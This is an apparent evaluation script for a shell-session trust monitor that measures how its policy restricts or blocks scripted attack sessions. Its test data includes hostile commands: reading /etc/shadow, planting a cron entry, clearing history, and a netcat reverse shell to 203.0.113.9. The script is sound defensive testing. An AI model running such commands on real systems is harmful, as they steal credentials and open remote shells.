"""Small, fully synthetic Stage 16 policy checks for the implemented MVP.

These controlled checks complement the Schonlau, cold-start, latency and alert
measurements. Scenario definitions are deliberately exposed in the JSON output.
"""
import json, math, sys
from pathlib import Path
sys.path.insert(0,str(Path(__file__).resolve().parents[2]))
from czt.brain.explain import explain_session
from czt.brain.policy import Policy
from czt.brain.rules import evaluate
from czt.brain.tokenizer import tokenize
from czt.brain.trust import Trust, logit, sigmoid
from czt.brain.meta import should_challenge

ROOT=Path(__file__).resolve().parents[2]; OUT=ROOT/"eval"/"results"
SETTINGS=json.loads((ROOT/"config/settings.json").read_text(encoding="utf-8"))

def judgment():
    sequence=["whoami","sudo -l","cat /etc/shadow","echo payload >> /etc/cron.d/update","history -c","nc -e /bin/sh 203.0.113.9 4444"]
    belief=Trust(SETTINGS["initial_belief"]); policy=Policy(SETTINGS); belief_first=None; belief_discard=None; counter_restrict=None; counter_discard=None; risky=0
    for index,command in enumerate(sequence,1):
        hits=evaluate(command); risky+=bool(hits)
        evidence=-sum(hit["weight"] for hit in hits); evidence=max(-SETTINGS["max_evidence_magnitude"],evidence)
        belief.add(evidence,SETTINGS["recovery_factor"]); state=policy.state(belief.belief,"allowed" if belief_first is None else ("restricted" if belief_first is not None and belief_discard is None else "discarded"))
        if state=="restricted" and belief_first is None: belief_first=index
        if state=="discarded" and belief_discard is None: belief_discard=index
        if counter_restrict is None and risky>=1: counter_restrict=index
        if counter_discard is None and risky>=3: counter_discard=index
    # A single benign anomaly should be recoverable by belief; counter policy has no recovery signal.
    odd=Trust(.72); odd.add(-.15,SETTINGS["recovery_factor"]); after_anomaly=odd.belief
    for _ in range(24): odd.add(.12,SETTINGS["recovery_factor"])
    return {"scenario":"one sudo enumeration, then a scripted four-rule hijack; counter baseline restricts at one rule hit and discards at three","commands_to_restricted":{"belief":belief_first,"counter":counter_restrict},"commands_to_discarded":{"belief":belief_discard,"counter":counter_discard},"benign_anomaly_recovery":{"belief_before":.72,"belief_after_anomaly":round(sigmoid(logit(.72)-.15),4),"belief_after_24_benign_updates":round(odd.belief,4),"counter_policy_recovers":False}}

def metacognition():
    import asyncio, tempfile
    from czt.brain.engine import Engine,Session
    from czt.store import Store
    class Writer:
        def write(self,event): return event
    class Process:
        def __init__(self): self.stdout=self; self.stdin=self
        def write(self,data): pass
        async def drain(self): pass
        async def readline(self): return b"NO\n"
        def get_extra_info(self,name): return ("synthetic",0)
    async def arm(challenge_enabled,commands):
        with tempfile.TemporaryDirectory(prefix="czts-stepup-") as temp:
            root=Path(temp); prior=root/"empty.jsonl"; prior.write_text("",encoding="utf-8")
            settings=dict(SETTINGS)
            if not challenge_enabled: settings["step_up_categories"]=[]; settings["role_overrides"]={}
            store=Store(str(root/"stepup.sqlite3")); engine=Engine(store,Writer(),settings,prior_path=prior); results=[]
            for index,command in enumerate(commands):
                sid=f"step-{index}"; store.start_session(sid,"user","synthetic"); session=Session(engine,sid,"user"); decision,row=await session.evaluate(command,Process()); session.finish(); results.append({"decision":decision,"step_up":any(e["event_type"]=="step_up" and e["session_id"]==sid for e in [json.loads(x[0]) for x in store.db.execute("SELECT payload FROM events WHERE session_id=?",(sid,))])})
            store.close(); return results
    sensitive=["cat /etc/shadow"]*8; clear=["ls -la"]*8
    with_step=asyncio.run(arm(True,sensitive)); without_step=asyncio.run(arm(False,sensitive)); benign=asyncio.run(arm(True,clear))
    return {"method":"actual Session.evaluate, Policy, step-up input path, and SQLite events; paired eight-case scenarios","malicious_sensitive_attempts":8,"blocked_with_step_up":sum(x["decision"] in {"block","discard"} and x["step_up"] for x in with_step),"allowed_without_step_up":sum(x["decision"]=="allow" for x in without_step),"clear_benign_actions":8,"benign_step_up_challenges":sum(x["step_up"] for x in benign),"raw":{"with_step_up":with_step,"without_step_up":without_step,"benign":benign}}

def counterfactuals():
    policy=Policy(SETTINGS); checks=0; flips=0
    # Replay all one-step negative-evidence crossings around the allowed boundary.
    for prior in [0.70+i*.01 for i in range(11)]:
        for evidence in [-.05,-.1,-.2,-.4,-.8,-1.2]:
            trust=Trust(prior,updated=1000); trust.decay(1001,SETTINGS["decay_half_life_seconds"],SETTINGS["recovery_factor"]); trust.add(evidence,SETTINGS["recovery_factor"]); new=policy.state(trust.belief,"allowed")
            if new!="allowed":
                commands=[{"seq":1,"ts":1001,"raw":"synthetic risky command","evidence":evidence,"step_up_evidence":0,"rule_hits":[{"name":"synthetic_rule"}]}]
                result=explain_session(commands,prior,1000,policy,SETTINGS,new); checks+=1; flips+=bool(result["counterfactual_flips"] and result["counterfactual_state"]=="allowed")
    return {"scenario":"single-command state crossings replayed through full-session replay helper, removing the cited command and applying time decay/hysteresis","state_change_cases":checks,"counterfactual_flips_verified":flips,"verified_fraction":flips/max(checks,1)}

def poisoning():
    from evaluate_poisoning import run as run_real_poisoning
    return run_real_poisoning()

def run():
    result={"synthetic_only":True,"seed":20261103,"experiments":{"simple_counter_baseline_example":judgment(),"metacognition_engine_check":metacognition(),"full_session_replay":counterfactuals(),"sqlite_poisoning_integration":poisoning()},"other_stage16_artifacts":{"personalization":"eval/results/schonlau_summary.json; five-seed results in eval/results/personalization_summary.json","hijack_response":"eval/results/judgment_summary.json","drift_and_learning":"eval/results/drift_summary.json","cold_start":"eval/results/cold_start_repeated_summary.json","overhead":"eval/results/latency_summary.json","discard_and_restricted_alerting":"eval/results/alert_latency_summary.json"}}
    OUT.mkdir(parents=True,exist_ok=True)
    (OUT/"stage16_raw.json").write_text(json.dumps(result,indent=2)+"\n",encoding="utf-8")
    (OUT/"stage16_summary.json").write_text(json.dumps({"synthetic_only":True,"seed":result["seed"],"experiments":{key:{k:v for k,v in value.items() if k!="raw"} for key,value in result["experiments"].items()},"other_stage16_artifacts":result["other_stage16_artifacts"]},indent=2)+"\n",encoding="utf-8")
    print(json.dumps(result,indent=2))
    try:
        import matplotlib
        matplotlib.use("Agg"); import matplotlib.pyplot as plt
        meta=result["experiments"]["metacognition_engine_check"]
        replay=result["experiments"]["full_session_replay"]["verified_fraction"]
        poison=result["experiments"]["sqlite_poisoning_integration"]
        labels=["Sensitive attempts blocked","Benign actions unchallenged","Counterfactual flips","Poison attempts rejected"]
        values=[meta["blocked_with_step_up"]/meta["malicious_sensitive_attempts"],1-meta["benign_step_up_challenges"]/meta["clear_benign_actions"],replay,1-poison["released_into_user_profile"]/poison["quarantined_attempts"]]
        fig,ax=plt.subplots(figsize=(8,4)); ax.barh(labels,values,color=["#2a9d8f","#287271","#457b9d","#e9c46a"])
        ax.set(xlabel="Rate",xlim=(0,1),title="Engine integration checks (scripted scenarios)"); ax.grid(axis="x",alpha=.25); fig.tight_layout(); fig.savefig(OUT/"stage16_checks.png",dpi=150); plt.close(fig)
    except ImportError: pass

if __name__=="__main__": run()
